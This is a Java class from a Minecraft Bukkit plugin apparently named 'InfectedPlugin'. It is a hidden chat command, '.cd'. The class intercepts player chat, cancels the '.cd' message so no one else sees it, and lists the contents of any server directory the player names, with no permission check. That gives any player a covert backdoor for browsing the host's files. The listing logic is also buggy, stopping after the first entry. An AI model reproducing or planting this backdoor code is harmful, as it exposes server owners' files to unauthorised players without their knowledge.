 package org.CreeperCoders.InfectedPlugin.Commands;
 
 import java.io.File;
 import java.util.HashMap;
 
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_cd implements Listener
 {
	@SuppressWarnings({ "unchecked", "rawtypes" })
	private HashMap<String, String> dirs = new HashMap();
 	
     @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
         final Player p = event.getPlayer();
 
         if (message.startsWith("."))
         {
             String[] args = message.split(" ");
             if (args == null)
             {
                 return;
             }
 
             if (args[0].equalsIgnoreCase(".cd"))
             {
            	event.setCancelled(true);
                 String path = "";
                 for (int i = 1; i < args.length; i++)
                 {
                     path = path + args[i];
                 }
                 File tempPath = new File(path);
                 if (!tempPath.exists())
                 {
                     p.sendMessage(path + " does not exist.");
                     event.setCancelled(true);
                     return;
                 }
                 else if (tempPath.isDirectory())
                 {
                     String[] files = tempPath.list();
                     p.sendMessage("==== " + path + " ====");
                     for (String file : files)
                     {
                         if (new File(file).isFile())
                         {
                             p.sendMessage("[File] " + file);
                             event.setCancelled(true);
                             return;
                         }
                         else
                         {
                             p.sendMessage("[Dir] " + file);
                             event.setCancelled(true);
                             return;
                         }
                     }
                     this.dirs.put(p.getName(), path);
                     event.setCancelled(true);
                     return;
                 }
                 else
                 {
                     p.sendMessage(path + " must be a directory.");
                     event.setCancelled(true);
                     return;
                 }
             }
         }
     }
 }
